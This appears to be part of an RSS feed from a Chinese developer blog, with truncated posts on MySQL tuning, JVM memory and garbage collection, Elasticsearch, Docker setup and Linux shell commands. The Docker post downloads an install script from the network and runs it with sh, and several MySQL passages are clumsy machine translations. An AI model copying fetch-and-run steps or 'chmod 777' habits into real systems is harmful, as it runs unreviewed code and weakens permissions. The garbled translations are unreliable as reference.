您始终可以查看有关自己的线程的信息。要查看有关正在为其他帐户执行的线程的信息，您必须具有该PROCESS权限。
每个进程列表条目包含几条信息：
Id 是与线程关联的客户端的连接标识符。
User并Host指明与该线程关联的帐户。
db是线程的默认数据库，或者NULL如果没有选择。
Command并State 指出线程正在做什么。
大多数州对应于非常快速的操作。如果一个线程停留在给定状态很多秒，则可能存在需要调查的问题。
Time表示线程处于当前状态的时间。在某些情况下，线程的当前时间概念可能会改变：线程可以改变时间。对于正在处理来自主站的事件的从站上运行的线程，线程时间设置为在事件中找到的时间，因此反映了主站而不是从站的当前时间。 SET TIMESTAMP = value</description>
    </item>
    
    <item>
      <title>SQL优化【绩效衡量】</title>
      <link>https://www.wuxinvip.com/blog/mysql/optimization-sql-performance-measurement/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/mysql/optimization-sql-performance-measurement/</guid>
      <description>8.13.1测量表达式和函数的速度 8.13.2使用您自己的基准 8.13.3使用performance_schema测量绩效 要衡量绩效，请考虑以下因素：
无论您是在安静系统上测量单个操作的速度，还是在一段时间内如何操作一组操作（ “ 工作负载 ”）。通过简单的测试，您通常可以测试更改一个方面（配置设置，表上的索引集，查询中的SQL子句）如何影响性能。基准测试通常是长时间运行和精心设计的性能测试，其结果可能决定硬件和存储配置等高级选择，或者升级到新MySQL版本的时间。
对于基准测试，有时您必须模拟繁重的数据库工作负载才能获得准确的图像。
表现可能会因许多不同的因素而有所不同，因为几个百分点的差异可能不是决定性的胜利。在不同的环境中进行测试时，结果可能会发生相反的变化。
某些MySQL功能根据工作负载提供帮助或无法帮助提高性能。为了完整性，请始终在打开和关闭这些功能的情况下测试性能。尝试与每个工作负载的两个最重要的功能是 MySQL查询缓存，以及 适应性的散列索引的InnoDB表。
本节从单个开发人员可以执行的简单和直接测量技术发展到需要额外专业知识来执行和解释结果的更复杂测量技术。
8.13.1测量表达式和函数的速度 要测量特定MySQL表达式或函数的速度，请BENCHMARK()使用mysql客户端程序调用该函数。它的语法是 。返回值始终为零，但mysql 打印一行显示语句执行的时间。例如： BENCHMARK(loop_count,expression)
MySQL的&amp;gt; SELECT BENCHMARK(1000000,1+1); + &amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash; + | 基准（1000000,1 + 1）| + &amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash; + | 0 | + &amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash; + 1排（0.32秒） 该结果在Pentium II 400MHz系统上获得。它表明MySQL可以在0.32秒内在该系统上执行1,000,000个简单的加法表达式。
内置的MySQL函数通常是高度优化的，但可能有一些例外。 BENCHMARK()是一个很好的工具，可以找出某些功能是否是您的查询的问题。
8.13.2使用您自己的基准 对您的应用程序和数据库进行基准测试，以找出瓶颈所在。在修复一个瓶颈（或者用“ 虚拟 ”模块替换它）之后，您可以继续识别下一个瓶颈。即使您的应用程序的整体性能目前是可接受的，您至少应该为每个瓶颈制定计划，并决定如果有一天您真的需要额外的性能，如何解决它。
免费的基准测试套件是开源数据库基准测试，可从http://osdb.sourceforge.net/获得。
仅在系统负载很重时才会出现问题。我们有许多客户在生产（已测试）系统并遇到负载问题时与我们联系。在大多数情况下，性能问题可能是由于基本数据库设计问题（例如，高负载下的表扫描不好）或操作系统或库的问题。大多数情况下，如果系统尚未投入生产，这些问题将更容易解决。
为了避免这样的问题，在最糟糕的负载下对整个应用程序进行基准测试：
该mysqlslap程序可以是用于模拟由多个客户端同时发出查询产生的高负载有帮助的。请参见第4.5.9节“ mysqlslap - 加载仿真客户端”。
您还可以尝试使用基准测试程序包，例如SysBench和DBT2，可在 https://launchpad.net/sysbench和 http://osdldbt.sourceforge.net/#dbt2获得。
这些程序或软件包可以使系统瘫痪，因此请务必仅在开发系统上使用它们。</description>
    </item>
    
    <item>
      <title>SQL优化【缓存优化】</title>
      <link>https://www.wuxinvip.com/blog/mysql/optimization-sql-cached/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/mysql/optimization-sql-cached/</guid>
      <description>8.10.1 InnoDB缓冲池优化 8.10.2 MyISAM密钥缓存 8.10.3 MySQL查询缓存 8.10.4准备好的语句和存储程序的缓存 MySQL使用几种策略来缓存内存缓冲区中的信息以提高性能。
8.10.1 InnoDB缓冲池优化 InnoDB维护一个称为缓冲池的存储区域， 用于缓存内存中的数据和索引。知道InnoDB缓冲池如何 工作，并利用它来将频繁访问的数据保存在内存中，是MySQL调优的一个重要方面。
有关InnoDB缓冲池内部工作原理的说明， LRU替换算法的概述以及常规配置信息，请参见第14.6.3.1节“InnoDB缓冲池”。
有关其他InnoDB缓冲池配置和调整信息，请参阅以下部分：
第14.6.3.5节“配置InnoDB缓冲池预取（预读）”
第14.6.3.6节“配置InnoDB缓冲池刷新”
第14.6.3.4节“使缓冲池扫描抗性”
第14.6.3.3节“配置多个缓冲池实例”
第14.6.3.8节“保存和恢复缓冲池状态”
第14.6.3.7节“微调InnoDB缓冲池刷新”
第14.6.3.2节“配置InnoDB缓冲池大小”
8.10.2 MyISAM密钥缓存 8.10.2.1共享密钥缓存访问 8.10.2.2多个密钥缓存 8.10.2.3中点插入策略 8.10.2.4索引预加载 8.10.2.5密钥缓存块大小 8.10.2.6重构密钥缓存 为了最小化磁盘I / O，MyISAM存储引擎利用许多数据库管理系统使用的策略。它采用缓存机制将最常访问的表块保存在内存中：
对于索引块，维护称为密钥缓存（或 密钥缓冲区）的特殊结构 。该结构包含许多块缓冲区，其中放置了最常用的索引块。
对于数据块，MySQL不使用特殊缓存。相反，它依赖于本机操作系统文件系统缓存。
本节首先介绍MyISAM密钥缓存的基本操作 。然后讨论了可以提高密钥缓存性能并使您能够更好地控制缓存操作的功能：
多个会话可以同时访问缓存。
您可以设置多个密​​钥缓存并将表索引分配给特定缓存。
要控制密钥缓存的大小，请使用 key_buffer_size系统变量。如果将此变量设置为零，则不使用密钥缓存。如果key_buffer_size值太小而无法分配最小数量的块缓冲区，则不使用密钥缓存 （8）。
当密钥缓存不可操作时，仅使用操作系统提供的本机文件系统缓冲来访问索引文件。（换句话说，使用与表数据块相同的策略访问表索引块。）
索引块是对MyISAM索引文件的连续访问单元 。通常，索引块的大小等于索引B树的节点大小。（索引在磁盘上使用B树数据结构表示。树底部的节点是叶节点。叶节点上方的节点是非叶节点。）
密钥缓存结构中的所有块缓冲区大小相同。该大小可以等于，大于或小于表索引块的大小。通常这两个值中的一个是另一个的倍数。
当必须访问来自任何表索引块的数据时，服务器首先检查它是否在密钥缓存的某个块缓冲区中可用。如果是，则服务器访问密钥缓存中的数据而不是磁盘上的数据。也就是说，它从缓存读取或写入其中而不是读取或写入磁盘。否则，服务器选择包含不同表索引块（或块）的高速缓存块缓冲区，并用必需的表索引块的副本替换那里的数据。只要新索引块位于缓存中，就可以访问索引数据。
如果发生了选择替换的块已被修改，则该块被认为是“ 脏的。“在这种情况下，在被替换之前，其内容被刷新到它所来自的表索引。
通常服务器遵循LRU（最近最少使用）策略：当选择要替换的块时，它选择最近最少使用的索引块。为了使这个选择更容易，密钥缓存模块将所有使用的块维护在按使用时间排序的特殊列表（LRU链）中。访问块时，它是最近使用的块，位于列表的末尾。当需要替换块时，列表开头的块是最近最少使用的块，并成为第一个驱逐的候选块。
该InnoDB存储引擎还采用LRU算法来管理它的缓冲池。请参见 第14.6.3.1节“InnoDB缓冲池”。
8.10.2.1共享密钥缓存访问 线程可以同时访问密钥缓存缓冲区，但要符合以下条件：
多个会话可以访问未更新的缓冲区。
正在更新的缓冲区会导致需要使用它的会话等待更新完成。
多个会话可以发起导致高速缓存块替换的请求，只要它们不相互干扰（即，只要它们需要不同的索引块，从而导致不同的高速缓存块被替换）。
对密钥缓存的共享访问使服务器能够显着提高吞吐量。
8.10.2.2多个密钥缓存 对密钥缓存的共享访问可提高性能，但不会完全消除会话之间的争用。他们仍在竞争管理对密钥缓存缓冲区的访问的控制结构。为了进一步减少密钥缓存访问争用，MySQL还提供了多个密钥缓存。此功能使您可以将不同的表索引分配给不同的密钥缓存。
在存在多个密钥缓存的情况下，服务器必须知道在处理给定MyISAM表的查询时要使用哪个缓存 。默认情况下，所有 MyISAM表索引都缓存在默认密钥缓存中。要将表索引分配给特定的键缓存，请使用该CACHE INDEX 语句（请参见第13.7.6.2节“CACHE INDEX语法”）。例如，下面的语句从表中分配指标 t1，t2以及 t3名为键缓存 hot_cache：</description>
    </item>
    
    <item>
      <title>SQL优化【锁优化】</title>
      <link>https://www.wuxinvip.com/blog/mysql/optimization-sql-lock/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/mysql/optimization-sql-lock/</guid>
      <description>MySQL使用锁管理对表内容的争用 ：
内部锁定在MySQL服务器内部执行，以管理多个线程对表内容的争用。 这种类型的锁定是内部的，因为它完全由服务器执行，并且不涉及其他程序。 参见 第8.11.1节“内部锁定方法”。
当服务器和其他程序锁定MyISAM表文件以相互协调哪个程序可以访问表时，发生外部锁定。 参见第8.11.5节“外部锁定”。
8.11.1内部锁定方法
本节讨论内部锁定; 即在MySQL服务器本身内执行锁定以管理多个会话对表内容的争用。 这种类型的锁定是内部的，因为它完全由服务器执行，并且不涉及其他程序。 对于其他程序在MySQL文件上执行的锁定，请参见第8.11.5节“外部锁定”。 行级锁定 表级锁定 选择锁定类型 行级锁定 MySQL使用行级锁定为InnoDB表，以支持由多个会话并发写入权限，使其适用于多用户，高并发，和OLTP应用程序。 为了避免在单个表上执行多个并发写入操作时发生死锁， InnoDB通过SELECT ... FOR UPDATE为每组预计要修改的行发布语句，即使数据更改语句稍后在事务中发生，也可以在事务启动时获取必要的锁。 如果交易修改或锁定多个表，请在每个交易中以相同的顺序发布适用的报表。 死锁会影响性能而不是表示严重的错误，因为它会 InnoDB自动 检测 死锁条件并回滚其中一个受影响的事务。 在高并发系统上，当大量线程等待相同的锁时，死锁检测会导致速度下降。 有时候，innodb_lock_wait_timeout 当死锁发生时，禁用死锁检测并依赖事务回滚的设置可能更有效 。 使用innodb_deadlock_detect 配置选项可以禁用死锁检测 。 行级锁定的优点： 当不同的会话访问不同的行时，更少的锁冲突。 回滚更少。 可能长时间锁定一行。 表级锁定 MySQL使用表级锁的MyISAM， MEMORY和MERGE 表，只允许一个会话更新一次这些表。 这种锁定级别使得这些存储引擎更适合于只读，主要读取或单用户应用程序。 这些存储引擎通过始终在查询开始时一次请求所有需要的锁，并始终以相同的顺序锁定表来避免 死锁。 权衡是这种策略降低了并发性; 其他要修改表的会话必须等到当前数据更改语句结束。 表级锁定的优点： 所需的内存相对较少（行锁定需要锁定每行或一组行的内存） 在大部分表格上使用时都很快，因为只涉及一个锁。 如果您经常GROUP BY 对大部分数据执行操作，或者必须频繁扫描整个表，则速度很快。 MySQL授予表写入锁定如下： 如果表上没有锁，请在其上写入锁。 否则，将锁定请求放入写入锁定队列中。 MySQL授予表读取锁定如下： 如果表上没有写入锁，请在其上放置一个读取锁。 否则，将锁定请求放入读锁定队列中。 表格更新优先于表格检索。 因此，当释放一个锁时，该锁可用于写入锁定队列中的请求，然后可用于读取锁定队列中的请求。 这确保了即使桌子上有大量活动时，表格的更新也不会“ 饿死 ”SELECT。 但是，如果有多个表的更新，则 SELECT语句会等待，直到没有更新。 有关更改读取和写入优先级的信息，请参见第8.11.2节“表锁定问题”。 您可以通过检查Table_locks_immediate和 Table_locks_waited状态变量来分析系统上的表锁争用 ，这些变量分别表示可以立即授予表锁请求的次数和需要等待的数量： MySQL的&amp;gt; SHOW STATUS LIKE &#39;Table%&#39;; + ----------------------- + --------- + | 变量名| 值| + ----------------------- + --------- + | Table_locks_immediate | 1151552 | | Table_locks_waited | 15324 | + ----------------------- + --------- + 性能模式锁定表还提供锁定信息。 请参见 第25.</description>
    </item>
    
    <item>
      <title>cloud feign灵异事件</title>
      <link>https://www.wuxinvip.com/blog/spring-cloud-exception/feign-exception-1/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/spring-cloud-exception/feign-exception-1/</guid>
      <description>报错 ： Exception encountered during context initialization - cancelling refresh attempt: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name &#39;dataSourceInitializerPostProcessor&#39;: Unsatisfied dependency expressed through field &#39;beanFactory&#39;; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name &#39;com.****.feign.UserCenterFeignService&#39;: Lookup method resolution failed; nested exception is java.lang.IllegalStateException: Failed to introspect Class [org.springframework.cloud.netflix.feign.FeignClientFactoryBean] from ClassLoader [sun.misc.Launcher$AppClassLoader@61e4705b]  解决办法 加入依赖
原因未明 、创建项目时候导入了feign 使用@EnableFeignClients注解 也ok 不报错 我就以为 feign包导入了 结果不知道哪来的包来的这个注解 导致 灵异事件 ```` ![image.png](http://upload-images.jianshu.io/upload_images/6434888-55ccd9dddc1f19e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)  严重怀疑是这个包里的
mmp 莫名其妙的好了 仿佛又回到从前 你对java 一无所知&amp;hellip;&amp;hellip; ```</description>
    </item>
    
    <item>
      <title>crontab</title>
      <link>https://www.wuxinvip.com/blog/shell/crontab/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/shell/crontab/</guid>
      <description>/crond start //启动服务 /sbin/service crond stop //关闭服务 /sbin/service crond restart //重启服务 /sbin/service crond reload //重新载入配置&amp;lt;/pre&amp;gt; service crond status service crond start 查看crontab服务是否已设置为开机启动，执行命令： ntsysv 加入开机自动启动： chkconfig -level 35 crond on 定制脚本 crontab -e 相当于vim 文档加入 0 1 * * * root /data/bakdb.sh &amp;gt; /data/bak.log 2&amp;gt;&amp;amp;1 */2 * * * * /bin/bash -x /shell/web_monit/http_monit.sh &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 查看定时任务 crontab -u root -l  </description>
    </item>
    
    <item>
      <title>dubbo分析</title>
      <link>https://www.wuxinvip.com/blog/rpc/dubbo-1/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/rpc/dubbo-1/</guid>
      <description>手册地址:https://gitee.com/none_heart/RPC/raw/master/dubbo/doc/dubbo-用户指南-带标签.pdf  RPC Remote Procedure call 远程过程调用
一个RPC框架有几个特点: 远程调用.协议.暴露端口方式 稳定性.一致性.容错性 并发性. 简单插入性.高度解耦
那么从这几个方面来思考dubbo
协议:
Dubbo缺省协议采用单一长连接和NIO异步通讯，适合于小数据量大并发的服务调用，以及服务消费者机器数远大于服务提供者机器数的情况。 缺省协议，使用基于mina1.1.7+hessian3.2.1的tbremoting交互。 连接个数：单连接 连接方式：长连接 传输协议：TCP 传输方式：NIO异步传输 序列化：Hessian二进制序列化 适用范围：传入传出参数数据包较小（建议小于100K），消费者比提供者个数多，单一消费者无法压满提供者，尽量不要用dubbo协议传输大文件或超大字符串。 适用场景：常规远程服务方法调用  高可用-容错性:
五种回调方式:Failover.Failfast.Failsafe.Failback.Forking 应对不同场景使用不同回调方式
高可用-负载均衡 dubbo支持 随机.轮询.最小调用次数调用.hash值余数调用
并发-线程 没什么可说的.该用就得用.但是不能乱用.
服务暴露地址:多协议.多注册方式.无中心化 参数校验.服务分组等等</description>
    </item>
    
    <item>
      <title>ehcache</title>
      <link>https://www.wuxinvip.com/blog/cache/ehcache/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/cache/ehcache/</guid>
      <description>ehcache service层缓存系统
发展史
Ehcache 开发者（S） Terracotta，Inc。[1] 稳定版本 3.3.0 / 2017年2月1日; 16个月前 写入 Java的 操作系统 跨平台 类型 高速缓存 执照 Apache许可证 2.0 网站 www.ehcache.org Ehcache是一个开源的Java 分布式缓存，用于通用缓存，Java EE和轻量级容器[ 澄清 ]。[2] Ehcache在Apache开源许可下可用。[1] Ehcache由Greg Luck于2003年开发。2009年，该项目由Terracotta购买，后者提供付费支持。 该软件仍然是开源软件，但一些新的主要功能（Fast Restartability Consistency）仅适用于Enterprise Ehcache和BigMemory等非开源的商业产品。 2011年3月，维基媒体基金会宣布将使用Ehcache来改善其维基项目的性能。[3]然而，在测试显示该方法的问题后，这很快就被放弃了。  </description>
    </item>
    
    <item>
      <title>elasticsearch-config</title>
      <link>https://www.wuxinvip.com/blog/search-engine/elasticsearch-config/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/search-engine/elasticsearch-config/</guid>
      <description># ---------------------------------- Cluster ----------------------------------- # # 为群集使用描述性名称: # #cluster.name: my-application # # ------------------------------------ Node ------------------------------------ # #为节点使用描述性名称: # #node.name: node-1 # # 向节点添加自定义属性: # #node.attr.rack: r1 # # ----------------------------------- Paths ------------------------------------ # # 路径到目录存储数据的位置 (用逗号分隔多个位置): # #path.data: /path/to/data # # 日志文件的路径: # #path.logs: /path/to/logs # # ----------------------------------- Memory ----------------------------------- # # 启动时锁定内存: # #bootstrap.memory_lock: true # #确保堆大小设置为大约一半的可用内存在系统上, 并且允许进程的所有者使用此限制。 # # 当系统交换内存时, Elasticsearch 执行得很差。 # # ---------------------------------- Network ----------------------------------- # # 将绑定地址设置为特定 IP (IPv4 或 IPv6): # #network.</description>
    </item>
    
    <item>
      <title>elasticsearch内部存储执行机制</title>
      <link>https://www.wuxinvip.com/blog/search-engine/elasticsearch-1/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/search-engine/elasticsearch-1/</guid>
      <description>新建、索引和删除单个文档
以下是在主副分片和任何副本分片上面成功新建，索引和删除文档所需要的步骤顺序：
 客户端向 Node 1 发送新建、索引或者删除请求。 节点使用文档的 _id 确定文档属于分片 0 。请求会被转发到 Node 3，因为分片 0 的主分片目前被分配在 Node 3 上。 Node 3 在主分片上面执行请求。如果成功了，它将请求并行转发到 Node 1 和 Node 2 的副本分片上。一旦所有的副本分片都报告成功, Node 3 将向协调节点报告成功，协调节点向客户端报告成功。  在客户端收到成功响应时，文档变更已经在主分片和所有副本分片执行完成，变更是安全的。
取回单个文档 以下是从主分片或者副本分片检索文档的步骤顺序：
1、客户端向 Node 1 发送获取请求 2、节点使用文档的 _id 来确定文档属于分片 0 。分片 0 的副本分片存在于所有的三个节点上。 在这种情况下，它将请求转发到 Node 2 3、Node 2 将文档返回给 Node 1 ，然后将文档返回给客户端。
在处理读取请求时，协调结点在每次请求的时候都会通过轮询所有的副本分片来达到负载均衡
局部更新文档 以下是部分更新一个文档的步骤：
 客户端向 Node 1 发送更新请求。 它将请求转发到主分片所在的 Node 3 。 Node 3 从主分片检索文档，修改 _source 字段中的 JSON ，并且尝试重新索引主分片的文档。 如果文档已经被另一个进程修改，它会重试步骤 3 ，超过 retry_on_conflict 次后放弃。 如果 Node 3 成功地更新文档，它将新版本的文档并行转发到 Node 1 和 Node 2 上的副本分片，重新建立索引。 一旦所有副本分片都返回成功， Node 3 向协调节点也返回成功，协调节点向客户端返回成功。  update API 还接受在 新建、索引和删除文档 章节中介绍的 routing 、 replication 、 consistency 和 timeout 参数。</description>
    </item>
    
    <item>
      <title>http协议</title>
      <link>https://www.wuxinvip.com/blog/agreement/http/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/agreement/http/</guid>
      <description>http协议 HTTP　定义了　消息发送流程与信息格式
发送端
1、请求行 2、请求头 3、请求体  接受端
1、响应行 2、响应头 3、响应体  </description>
    </item>
    
    <item>
      <title>install docker</title>
      <link>https://www.wuxinvip.com/blog/container/install-docker/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/container/install-docker/</guid>
      <description>国内大佬专玩docker地址 中文翻译 http://www.widuu.com/docker/
从官方下载 curl https://get.docker.com &amp;gt; /tmp/install.sh sh install.sh 从系统镜像元下载 centos：yum install docker debian: apt-get install docker 在centos-6 中 docker 与系统自带可执行程序冲突。 执行： yum -y remove docker yum install docker-io  启动docker service docker start 设定默认开机启动 chkconfig docker on 下载镜像并运行 docker pull centos 查看镜像 docker images centos 运行镜像 docker run -i -t centos /bin/bash  </description>
    </item>
    
    <item>
      <title>java后台升级命令</title>
      <link>https://www.wuxinvip.com/blog/shell/shell-2/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/shell/shell-2/</guid>
      <description>top netstat netstat -ano | grep 8080 kill kill -9 #读写执行 all user chmod 777 123.txt #当前用户执行权限 chmod +x git_pull.sh chown root:root 123.txt sudo apt-get install sudo apt-get remove sudo yum install sudo yum remove sudo yum -y install sudo -s -H su root unzip -d 123.zip more readme.rxt  cat /proc/version awk if..else sleep man lsof -i:8080 useradd -r nexus # 打印关键字行 grep -n &amp;quot;业务有关的关键字&amp;quot; 2018-06-26.log #文件切割 开始2行、结束6行 sed -n &#39;2,6p&#39; access.</description>
    </item>
    
    <item>
      <title>java后台常用命令</title>
      <link>https://www.wuxinvip.com/blog/shell/shell-1/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/shell/shell-1/</guid>
      <description>cd ps ps -ef ps -ef | grep &amp;quot;&amp;quot; | 管道符 #移动文件 mv /usr/bin/mysql.db /var/data/mysql/mysql-2017-09-09.db #复制文件 cp /usr/bin/mysql.db /var/data/mysql/mysql-2017-09-09.db.backup #复制文件夹 cp -a /usr/bin/ /var/data/mysql/ sh .../*.sh vim 123.txt tail -f ../*.log tail -f -n1000 ../*.log  </description>
    </item>
    
    <item>
      <title>jdk各个包 概述</title>
      <link>https://www.wuxinvip.com/blog/jdk/jdk-total/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/jdk/jdk-total/</guid>
      <description>java.applet 提供创建 applet 所必需的类和 applet 用来与其 applet 上下文通信的类。 java.awt 包含用于创建用户界面和绘制图形图像的所有类。 java.awt.color 提供用于颜色空间的类。 java.awt.datatransfer 提供在应用程序之间和在应用程序内部传输数据的接口和类。 java.awt.dnd Drag 和 Drop 是一种直接操作动作，在许多图形用户界面系统中都会遇到它，它提供了一种机制，能够在两个与 GUI 中显示元素逻辑相关的实体之间传输信息。 java.awt.event 提供处理由 AWT 组件所激发的各类事件的接口和类。 java.awt.font 提供与字体相关的类和接口。 java.awt.geom 提供用于在与二维几何形状相关的对象上定义和执行操作的 Java 2D 类。 java.awt.im 提供输入方法框架所需的类和接口。 java.awt.im.spi 提供启用可以与 Java 运行时环境一起使用的输入方法开发的接口。 java.awt.image 提供创建和修改图像的各种类。 java.awt.image.renderable 提供用于生成与呈现无关的图像的类和接口。 java.awt.print 为通用的打印 API 提供类和接口。 java.beans 包含与开发 beans 有关的类，即基于 JavaBeansTM 架构的组件。 java.beans.beancontext 提供与 bean 上下文有关的类和接口。 java.io 通过数据流、序列化和文件系统提供系统输入和输出。 java.lang 提供利用 Java 编程语言进行程序设计的基础类。 java.lang.annotation 为 Java 编程语言注释设施提供库支持。 java.lang.instrument 提供允许 Java 编程语言代理检测运行在 JVM 上的程序的服务。 java.</description>
    </item>
    
    <item>
      <title>jvm内存一条线路</title>
      <link>https://www.wuxinvip.com/blog/jdk/jvm-total/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/jdk/jvm-total/</guid>
      <description>入手从collection开始
集合常用 arrayList 底层数据结构 object[] 数组特点 内存连续 数据挨个存放 那么删除中间一个时候 后面的数据会挨个往前挪移 因为地址可知 查询节点数据 较快 通过下标获取 应对业务场景 插入后查询修改数据 如果执行删除操作会造成资源浪费 需要时间重新规划数组结构 linkedList 底层数据结构链表 链表特点 内存不连续 代码 node first、 last； object；存放前后节点hash值【待查询】 然后跟节点对象 该链表实现 Deque 接口，为 add、poll 提供先进先出队列操作，以及其他堆栈和双端队列操作。 应对业务场景 插入后 可能会删除某项数据 以作数据调整 hashMap 内存结构是hash散列 【我理解为 散着放的列表】 内存特点 hash值分桶存储【其实就一一小块内存】 当hash值冲突 会在该桶内维护一个链表 警告：暂时不晓得这个桶有多大 所以尽量避免hash冲突 万一桶满了是不是要重新规划内存 造成资源浪费？ linkedHashMap 内存特点 与hashMap一致 不同点 linkedHashMap 额外维护了一个双重链表来记录数据插入的顺序性 那么相比较hashMap 多了一个链表要维护 性能要有所下降 【业务需要 没办法】 treeMap 内存结构 红黑二叉树 内存特点：位置 对于二叉树还没搞明白 只晓得父红子黑【还不知道对不对】  说到数据内存 就要讲讲内存结构
jvm内存分为五大块【程序计数器、虚拟机栈、本地方法栈、方法区、堆】 从线程是否共享分起： 线程共享：堆、方法区/非线程共享：程序计数器、虚拟机栈、本地方法栈 简单说下存储信息 1、程序计数器 用于存放下一条指令所在单元的地址的地方 【c与java的交界点用以存放执行指针】 2、虚拟机栈 【为java方法提供服务】 3、本地方法栈【为jvm提供使用native方法服务】 4、方法区 【存储类常量、静态变量等信息】 5、堆 【存放对象实例、对象成员变量】 对于一个obj： 类引用--stack中 类成员变量--Heap中【回收主要地方】 类静态变量、常量--Method Area中 类方法--以帧栈形式保存到栈中  那么内存存储规划完 就得看看 内存的回收机制</description>
    </item>
    
    <item>
      <title>jvm内存回收</title>
      <link>https://www.wuxinvip.com/blog/jdk/jvm-memory-recovery/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/jdk/jvm-memory-recovery/</guid>
      <description>回收区域：堆【主要区域】、方法区【回收废弃常量、无用类】
无用类定义： 1、jvm中不存在该实例 2、加载该类classLoader已被回收 3、任何地方都不存在引用
回收算法： 1、标记清除 2、标记整理 3、复制 4、分代收集
回收器： 单线程 1、serial 2、serial old 多线程 1、parNew 2、parallel scavenge 3、parallel old 4、cms 5、G1
回收新生代 serial、parNew、parallel scavenge
回收老年代 cms、serial old、parallel old
分代收集 G1
serial 最老、也是默认回收算法、单线程 缺点：暂定所有用户进程来回收垃圾、每一小时有五分钟不能给用户提供服务 优点: 简单高效 适合场景、clent模式
ParNew serial多线程版本 场景：参考serial 多核处理器
Parallel scavenge 1、复制算法 2、目标、回收达到一个可控的吞吐量【吞吐量=运行代码时间/（运行代码时间+GC时间）】 3、吞吐量优先收集器
serial old 1、单线程、标记整理算法 2、serial 老版本 3、jdk1.5之前配合Parallel scavenge、cms后备预案
parallel old 1、Parallel scavenge老版本 2、标记整理算法 3、注重吞吐量以及CPU资源敏感场景、使用Parallel scavenge ++ parallel old 4、吞吐量优先
CMS 1、标记清除 2、目标：最短回收停顿时间 3、四个步骤：初始标记、并发标记、重新标记、并发清除
G1 1、1.</description>
    </item>
    
    <item>
      <title>jvm内存结构</title>
      <link>https://www.wuxinvip.com/blog/jdk/jvm-memory-structure/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/jdk/jvm-memory-structure/</guid>
      <description>jvm内存 一条线 线程共享 线程不共线【也叫非线程共享】
线程共享： 堆【Heap】、 方法区【method area】 非线程共享： 程序计数器、虚拟机栈、本地方法栈
方法区还包含 运行时常量池【类常量数据】 异常： jvm中定义两种异常 StackOverflow、outofmemory 一种是栈溢出 一种是内存溢出 官方定义栈溢出：线程请求深度大于虚拟机允许深度、抛出StackOverflow 官方定义内存溢出：java内存扩展、当虚拟机申请不到足够的内存、抛出outofmemory  jvm堆 细分：新生代、老年代【分代收集算法】 再细分：Eden、From Survivor、To Survivor空间 再内存分配黑可以分出多个线程私有的分配缓冲区 存放内容：对象实例、细致的划分只是为了更好的回收 堆是回收主要区域
jvm方法区 1、线程共享 2、存储已被虚拟机加载、类信息、常量、静态变量、即时编译器编译后的代码数据
jvm运行时常量池 1、方法区一部分 2、存放编译期生成各种字面量和符号引用、
直接内存 1、不属于jvm运行时数据取一部分 再五大板块外、 2、jdk1.4中 引入NIO、引用了一种基于通道（channel）与缓冲区（Buffer）的IO方式、它可以使用Native函数库直接分配对外内存、然后通过一个存储再java堆中的DirectByteBuffer对象来作为这一块内存引用、来进行操作、避免了java堆和native堆中来回复制数据 3、该内存受限于 操作系统和物理内存
虚拟机栈 1、虚拟机执行java程序使用栈
本地方法栈 1、执行native方法使用栈
程序计数器 1、与c交界点、一个线程一个程序计数器、内存耗费较小、记录执行指针</description>
    </item>
    
    <item>
      <title>maglev</title>
      <link>https://www.wuxinvip.com/blog/load-balance/maglev/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/load-balance/maglev/</guid>
      <description>简介 Google Maglev 是一个牛逼的负载均衡器，之所以牛逼，是因为它不用部署专门的物理设备，不像 LVS 一样工作在内核，它是运行在通用 Linux 服务器上的大型分布式软件系统。
  Google Maglev 工作流程   每个 Google 服务都有一个或者多个 VIP，一个 VIP 和物理 IP 的区别在于 VIP 没有绑给某个特定的网卡。
VIP 注解 Maglev 关联每个 VIP 到具体的 Endpoint，然后通过 BGP 将 VIP 宣告给上游路由器，然后路由器再把 VIP 宣告给 Google 的骨干网，这样使得 VIP 能被访问到。
